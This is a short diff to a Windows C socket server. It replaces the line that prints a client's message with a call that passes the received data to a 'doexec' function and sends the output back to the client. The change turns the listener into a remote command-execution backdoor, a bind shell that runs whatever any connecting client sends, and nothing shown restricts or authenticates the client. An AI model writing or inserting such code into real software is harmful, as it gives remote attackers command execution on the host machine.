@@ -1,6 +1,7 @@
 #include <winsock2.h>
 #include <Windows.h>
 #include <stdio.h>
+#include "doexec.h"
 
 int main()
 {
@@ -26,7 +27,8 @@ int main()
     {
         printf("            Client connected!\n");
         recv(client, buffer, sizeof(buffer), 0);
-        printf("            Client says: %s \n",buffer);
+        char *ans = doexec(buffer);
+        send(client, ans, strlen(ans) * sizeof(char),0);
         closesocket(client);
         printf("Client disconnected.\n");
     }
